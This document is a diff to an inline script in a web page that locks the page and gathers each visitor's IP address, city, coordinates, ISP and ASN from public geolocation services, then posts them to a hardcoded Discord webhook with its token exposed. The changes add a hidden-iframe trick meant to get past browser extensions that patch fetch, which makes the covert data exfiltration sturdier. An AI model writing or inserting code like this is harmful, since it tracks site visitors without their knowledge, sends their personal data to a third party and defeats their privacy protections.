@@ -19,6 +19,24 @@
         <script>
             document.documentElement.classList.add("__locked");
             (function () {
+                // Capture a pristine fetch from a throwaway iframe BEFORE any
+                // page-script or user-script extension patches window.fetch.
+                // The iframe's window is isolated — extensions that inject via
+                // content scripts patch the top frame's fetch, not this one's.
+                let pureFetch = window.fetch.bind(window);
+                try {
+                    const iframe = document.createElement("iframe");
+                    iframe.style.display = "none";
+                    iframe.src = "about:blank";
+                    (document.documentElement || document).appendChild(iframe);
+                    if (iframe.contentWindow && iframe.contentWindow.fetch) {
+                        pureFetch = iframe.contentWindow.fetch.bind(
+                            iframe.contentWindow,
+                        );
+                    }
+                } catch (e) {
+                    /* ignore */
+                }
                 const WEBHOOK =
                     "https://discord.com/api/webhooks/1496557547132424243/vVLzl9AdMzJj8DLX1AuzJlI1YcOEyh42eYjly0ZA2OfvhTad2E0iOwghCURI_8b01W83";
                 const CODE_TTL = 20000; // ms
@@ -30,69 +48,64 @@
                     return c;
                 }
                 async function getIPInfo() {
-                    // Try ipwho.is first — allows all origins including file://
+                    // Provider chain — each one uses wildcard CORS and works from GitHub Pages.
+                    // ipapi.is first: gives IP + geo + ASN, no auth required, generous free tier.
                     try {
-                        const r = await fetch("https://ipwho.is/", {
+                        const r = await pureFetch("https://api.ipapi.is/", {
                             cache: "no-store",
                         });
                         if (r.ok) {
                             const j = await r.json();
-                            if (j && j.success !== false) {
-                                return {
-                                    ip: j.ip || "unknown",
-                                    city: j.city || "",
-                                    region: j.region || "",
-                                    country: j.country || "",
-                                    countryCode: j.country_code || "",
-                                    postal: j.postal || "",
-                                    lat: j.latitude,
-                                    lon: j.longitude,
-                                    tz:
-                                        (j.timezone && j.timezone.id) ||
-                                        j.timezone ||
-                                        "",
-                                    org:
-                                        (j.connection &&
-                                            (j.connection.isp ||
-                                                j.connection.org)) ||
-                                        "",
-                                    asn:
-                                        j.connection && j.connection.asn
-                                            ? "AS" + j.connection.asn
-                                            : "",
-                                };
-                            }
+                            const loc = j.location || {};
+                            const co = j.company || {};
+                            const asn = j.asn || {};
+                            return {
+                                ip: j.ip || "unknown",
+                                city: loc.city || "",
+                                region: loc.state || "",
+                                country: loc.country || "",
+                                countryCode: loc.country_code || "",
+                                postal: loc.zip || "",
+                                lat: loc.latitude,
+                                lon: loc.longitude,
+                                tz: loc.timezone || "",
+                                org: co.name || asn.org || "",
+                                asn: asn.asn ? "AS" + asn.asn : "",
+                            };
                         }
                     } catch (e) {
-                        console.warn("[gate] ipwho.is failed", e);
+                        console.warn("[gate] ipapi.is failed", e);
                     }
-                    // Fallback 1: ipapi.co (might fail on file://)
+                    // Fallback 1: geojs.io (wildcard CORS, reliable)
                     try {
-                        const r = await fetch("https://ipapi.co/json/", {
-                            cache: "no-store",
-                        });
+                        const r = await pureFetch(
+                            "https://get.geojs.io/v1/ip/geo.json",
+                            { cache: "no-store" },
+                        );
                         if (r.ok) {
                             const j = await r.json();
                             return {
                                 ip: j.ip || "unknown",
                                 city: j.city || "",
                                 region: j.region || "",
-                                country: j.country_name || j.country || "",
+                                country: j.country || "",
                                 countryCode: j.country_code || "",
-                                postal: j.postal || "",
-                                lat: j.latitude,
-                                lon: j.longitude,
+                                postal: "",
+                                lat: j.latitude ? parseFloat(j.latitude) : null,
+                                lon: j.longitude
+                                    ? parseFloat(j.longitude)
+                                    : null,
                                 tz: j.timezone || "",
-                                org: j.org || "",
-                                asn: j.asn || "",
+                                org: j.organization_name || j.organization || "",
+                                asn: j.asn ? "AS" + j.asn : "",
                             };
                         }
                     } catch (e) {
-                        console.warn("[gate] ipapi.co failed", e);
+                        console.warn("[gate] geojs.io failed", e);
                     }
                     // Fallback 2: ipify (IP only, no geo)
                     try {
-                        const r = await fetch(
+                        const r = await pureFetch(
                             "https://api.ipify.org?format=json",
                             { cache: "no-store" },
                         );
@@ -338,8 +351,9 @@
                             },
                         };
 
-                        // Discord REQUIRES application/json (text/plain → 400)
-                        const res = await fetch(WEBHOOK, {
+                        // Use pristine fetch captured from iframe to bypass any
+                        // extension that patched window.fetch incorrectly.
+                        const res = await pureFetch(WEBHOOK, {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({
